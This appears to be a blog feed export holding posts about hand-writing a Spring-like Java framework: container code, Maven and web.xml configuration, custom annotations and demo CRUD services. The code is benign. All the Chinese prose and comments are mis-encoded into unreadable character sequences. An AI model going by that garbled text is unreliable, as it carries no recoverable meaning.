class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAutowired</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, MyBeanDefinition&gt; beanDefinitionEntry : beanDefinitionMap.entrySet()) &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> beanDefinitionEntry.getKey();            <span class="hljs-keyword">if</span>(!beanDefinitionEntry.getValue().isLazyInit())&#123;                <span class="hljs-keyword">try</span> &#123;                    getBean(beanName);                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doRegisterBeanDefinition</span><span class="hljs-params">(List&lt;MyBeanDefinition&gt; beanDefinitionList)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">for</span> (MyBeanDefinition beanDefinition : beanDefinitionList) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">super</span>.beanDefinitionMap.containsKey(beanDefinition.getFactoryBeanName()))&#123;                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;The \&quot;&quot;</span>+beanDefinition.getFactoryBeanName()+<span class="hljs-string">&quot;\&quot; is exist!!!&quot;</span>);            &#125;            <span class="hljs-built_in">super</span>.beanDefinitionMap.put(beanDefinition.getFactoryBeanName(),beanDefinition);            <span class="hljs-comment">//åˆ°è¿™å®¹å™¨åˆå§‹åŒ–å®Œæ¯•</span>        &#125;    &#125;    <span class="hljs-comment">// TODO ä¾èµ–æ³¨å…¥ä»è¿™é‡Œå¼€å§‹ï¼Œè¯»å–BeanDefinitionä¸­çš„ä¿¡æ¯ï¼Œç„¶åé€šè¿‡åå°„åˆ›å»ºä¸€ä¸ªå®ä¾‹å¹¶è¿”å›ï¼Œä¸ä¼šæ”¾åŸå§‹å¯¹è±¡è¿›å»ï¼Œspring</span>    <span class="hljs-comment">// TODO é‡Œé¢ä¼šç”¨ä¸€ä¸ªBeanWrapperè¿›è¡Œä¸€æ¬¡åŒ…è£…</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String beanName)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(Class&lt;?&gt; beanClass)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> getBean(beanClass.getName());    &#125;        <span class="hljs-keyword">public</span> String[] getBeanDefinitionNames()&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.beanDefinitionMap.keySet().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[getBeanDefinitionCount()]);    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBeanDefinitionCount</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.beanDefinitionMap.size();    &#125;        <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.reader.getConfig();    &#125;    &#125;</code></pre></div></li><li><p>ApplicationContextAwareï¼šé€šè¿‡å®ç°ä¾¦å¬æœºåˆ¶å¾—åˆ°ä¸€ä¸ªå›è°ƒæ–¹æ³•ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå³ApplicationContextï¼Œå…ˆåšè®¾è®¡ï¼Œåé¢å†çœ‹æƒ…å†µ</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.context;<span class="hljs-comment">/**</span><span class="hljs-comment"> * é€šè¿‡è§£è€¦æ–¹å¼è·å¾—IOCå®¹å™¨çš„é¡¶å±‚è®¾è®¡</span><span class="hljs-comment"> * åé¢å°†é€šè¿‡ä¸€ä¸ªç›‘å¬å™¨å»æ‰«ææ‰€æœ‰çš„ç±»ï¼Œåªè¦å®ç°äº†æ­¤æ¥å£ï¼Œ</span><span class="hljs-comment"> * å°†è‡ªåŠ¨è°ƒç”¨setApplicationContext()æ–¹æ³•ï¼Œä»è€Œå°†IOCå®¹å™¨æ³¨å…¥åˆ°ç›®æ ‡ç±»ä¸­</span><span class="hljs-comment"> * Created by czh</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyApplicationContextAware</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationContext</span><span class="hljs-params">(MyApplicationContext applicationContext)</span>;&#125;</code></pre></div></li></ul><h2 id="ä»Šæ—¥æˆ˜å†µæ¦‚è§ˆ"><a href="#ä»Šæ—¥æˆ˜å†µæ¦‚è§ˆ" class="headerlink" title="ä»Šæ—¥æˆ˜å†µæ¦‚è§ˆ"></a>ä»Šæ—¥æˆ˜å†µæ¦‚è§ˆ</h2><p><img src="https://img-blog.csdnimg.cn/d76336c4daa542098c2c46fff167b368.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>æ‰‹å†™spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è®¾è®¡æ¨¡å¼</title>
    <link href="/2022/08/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/08/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="è®¾è®¡æ¨¡å¼ï¼ˆupdatingï¼‰"><a href="#è®¾è®¡æ¨¡å¼ï¼ˆupdatingï¼‰" class="headerlink" title="è®¾è®¡æ¨¡å¼ï¼ˆupdatingï¼‰"></a>è®¾è®¡æ¨¡å¼ï¼ˆupdatingï¼‰</h1><p>[TOC]</p><h2 id="1-å·¥å‚æ¨¡å¼"><a href="#1-å·¥å‚æ¨¡å¼" class="headerlink" title="1.å·¥å‚æ¨¡å¼"></a>1.å·¥å‚æ¨¡å¼</h2><h2 id="2-å•ä¾‹æ¨¡å¼"><a href="#2-å•ä¾‹æ¨¡å¼" class="headerlink" title="2.å•ä¾‹æ¨¡å¼"></a>2.å•ä¾‹æ¨¡å¼</h2><h2 id="3-åŸå‹æ¨¡å¼"><a href="#3-åŸå‹æ¨¡å¼" class="headerlink" title="3.åŸå‹æ¨¡å¼"></a>3.åŸå‹æ¨¡å¼</h2><h2 id="4-ä»£ç†æ¨¡å¼"><a href="#4-ä»£ç†æ¨¡å¼" class="headerlink" title="4.ä»£ç†æ¨¡å¼"></a>4.ä»£ç†æ¨¡å¼</h2><h2 id="5-å§”æ´¾æ¨¡å¼"><a href="#5-å§”æ´¾æ¨¡å¼" class="headerlink" title="5. å§”æ´¾æ¨¡å¼"></a>5. å§”æ´¾æ¨¡å¼</h2><h2 id="6-ç­–ç•¥æ¨¡å¼"><a href="#6-ç­–ç•¥æ¨¡å¼" class="headerlink" title="6.ç­–ç•¥æ¨¡å¼"></a>6.ç­–ç•¥æ¨¡å¼</h2><h2 id="7-æ¨¡ç‰ˆæ¨¡å¼"><a href="#7-æ¨¡ç‰ˆæ¨¡å¼" class="headerlink" title="7.æ¨¡ç‰ˆæ¨¡å¼"></a>7.æ¨¡ç‰ˆæ¨¡å¼</h2><h2 id="8-é€‚é…å™¨æ¨¡å¼"><a href="#8-é€‚é…å™¨æ¨¡å¼" class="headerlink" title="8.é€‚é…å™¨æ¨¡å¼"></a>8.é€‚é…å™¨æ¨¡å¼</h2><h2 id="9-è£…é¥°è€…æ¨¡å¼"><a href="#9-è£…é¥°è€…æ¨¡å¼" class="headerlink" title="9.è£…é¥°è€…æ¨¡å¼"></a>9.è£…é¥°è€…æ¨¡å¼</h2><h2 id="10-è§‚å¯Ÿè€…æ¨¡å¼"><a href="#10-è§‚å¯Ÿè€…æ¨¡å¼" class="headerlink" title="10.è§‚å¯Ÿè€…æ¨¡å¼"></a>10.è§‚å¯Ÿè€…æ¨¡å¼</h2>]]></content>
    
    
    <categories>
      
      <category>å¼€å‘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æš‘å‡æœ€åå‡ å¤©ï¼è‚çˆ†ï¼ˆæ‰‹å†™ï¼‰ä¸€ä¸ªSpringä¹‹Day2</title>
    <link href="/2022/08/14/spring_day02/"/>
    <url>/2022/08/14/spring_day02/</url>
    
    <content type="html"><![CDATA[<h1 id="Day02â€”Springå¼€æ’¸å‰ä¹‹ç¯å¢ƒå‡†å¤‡"><a href="#Day02â€”Springå¼€æ’¸å‰ä¹‹ç¯å¢ƒå‡†å¤‡" class="headerlink" title="Day02â€”Springå¼€æ’¸å‰ä¹‹ç¯å¢ƒå‡†å¤‡"></a>Day02â€”Springå¼€æ’¸å‰ä¹‹ç¯å¢ƒå‡†å¤‡</h1><h2 id="åŸºç¡€é…ç½®"><a href="#åŸºç¡€é…ç½®" class="headerlink" title="åŸºç¡€é…ç½®"></a>åŸºç¡€é…ç½®</h2><ul><li><p>ä¸€å¼€å§‹è‚¯å®šå¤šå°‘æ˜¯æœ‰ç‚¹æ‡µbçš„ï¼Œä½†æ˜¯å’±å†·é™ä¸€ä¸‹æ•´ç†æ€è·¯ã€‚ã€‚ã€‚</p></li><li><p>æ–°å»ºä¸€ä¸ªMaven webé¡¹ç›®ï¼Œä¸ä¼šçœ‹æ•™ç¨‹ï¼š<a href="http://t.csdn.cn/YugX1%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%80%8E%E4%B9%88%E5%90%AF%E5%8A%A8%E5%B0%B1%E6%98%AF%E6%89%93war%E5%8C%85%E5%9C%A8tomcat%E4%B8%8A%E8%BF%90%E8%A1%8C">http://t.csdn.cn/YugX1ï¼Œåé¢æ€ä¹ˆå¯åŠ¨å°±æ˜¯æ‰“waråŒ…åœ¨tomcatä¸Šè¿è¡Œ</a></p></li><li><p>ç”¨application.propertiesä»£æ›¿application.xmlï¼ˆç½‘ä¸Šå¸¸è§åšæ³•ï¼‰</p></li><li><p><img src="https://img-blog.csdnimg.cn/7de80e859c1e4b1aa177b9a737b4dfff.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>pom.xmlé…ç½®</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.czh<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>luelueking_Spring_Source<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet.api.version</span>&gt;</span>2.4<span class="hljs-tag">&lt;/<span class="hljs-name">servlet.api.version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;servlet.api.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.36<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ch.qos.logback<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>logback-classic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre></div></li><li><p>é…ç½®web.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>luelueking Spring Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mymvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.czh.spring.framework.webmvc.servlet.MyDispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:application.properties<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mymvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></code></pre></div></li><li><p>åˆ›å»ºservletä½œä¸ºMVCçš„å…¥å£</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc.servlet;<span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doGet(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doPost(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;        <span class="hljs-built_in">super</span>.init(config);    &#125;&#125;</code></pre></div></li><li><p>åœ¨æ¥ç‚¹æ³¨è§£ï¼ˆæ³¨æ„Targetä½œç”¨åŸŸï¼‰</p><p><img src="https://img-blog.csdnimg.cn/c9bd1fdd6f874383a92427b052f3f3ce.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.FIELD&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyAutowired &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyController &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyRequestMapping &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(ElementType.PARAMETER)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyRequestParam &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-type">boolean</span> <span class="hljs-title function_">required</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyService &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;</code></pre></div></li></ul><h2 id="ä¸šåŠ¡ä»£ç "><a href="#ä¸šåŠ¡ä»£ç " class="headerlink" title="ä¸šåŠ¡ä»£ç "></a>ä¸šåŠ¡ä»£ç </h2><ul><li><p>æ•´ä¸ªæŸ¥è¯¢ä¸šåŠ¡</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service;<span class="hljs-comment">/**</span><span class="hljs-comment"> * æŸ¥è¯¢ä¸šåŠ¡</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QueryService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * æŸ¥è¯¢</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service.impl;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.QueryService;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyService;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<span class="hljs-keyword">import</span> java.util.Date;<span class="hljs-meta">@Slf4j</span><span class="hljs-meta">@MyService</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QueryServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">QueryService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * æŸ¥è¯¢</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span> &#123;        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> sdf.format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;name:\&quot;&quot;</span> + name + <span class="hljs-string">&quot;\&quot;,time:\&quot;&quot;</span> + time + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>;        log.info(<span class="hljs-string">&quot;è¿™æ˜¯åœ¨ä¸šåŠ¡æ–¹æ³•ä¸­æ‰“å°çš„ï¼š&quot;</span> + json);        <span class="hljs-keyword">return</span> json;    &#125;&#125;</code></pre></div></li><li><p>CURDéƒ½è¡¥ä¸Š</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ModifyService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * å¢åŠ </span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">add</span><span class="hljs-params">(String name, String addr)</span> <span class="hljs-keyword">throws</span> Exception;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * ä¿®æ”¹</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">edit</span><span class="hljs-params">(Integer id, String name)</span>;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * åˆ é™¤</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">remove</span><span class="hljs-params">(Integer id)</span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service.impl;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.ModifyService;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModifyServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ModifyService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * å¢åŠ </span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">add</span><span class="hljs-params">(String name, String addr)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService add,name=&quot;</span> + name + <span class="hljs-string">&quot;,addr=&quot;</span> + addr;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * ä¿®æ”¹</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">edit</span><span class="hljs-params">(Integer id, String name)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService edit,id=&quot;</span> + id + <span class="hljs-string">&quot;,name=&quot;</span> + name;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * åˆ é™¤</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">remove</span><span class="hljs-params">(Integer id)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService id=&quot;</span> + id;    &#125;&#125;</code></pre></div></li><li><p>æ•´ä¸ªControlleræ•´åˆCRUD</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.controller;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.ModifyService;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.QueryService;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.*;<span class="hljs-keyword">import</span> com.czh.spring.framework.webmvc.MyModelAndView;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.Arrays;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-comment">/**</span><span class="hljs-comment"> * å…¬å¸ƒæ¥å£url</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span><span class="hljs-meta">@MyController</span><span class="hljs-meta">@MyRequestMapping(&quot;/web&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CRUDController</span> &#123;<span class="hljs-meta">@MyAutowired</span>QueryService queryService;<span class="hljs-meta">@MyAutowired</span>ModifyService modifyService;<span class="hljs-meta">@MyRequestMapping(&quot;/query.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">query</span><span 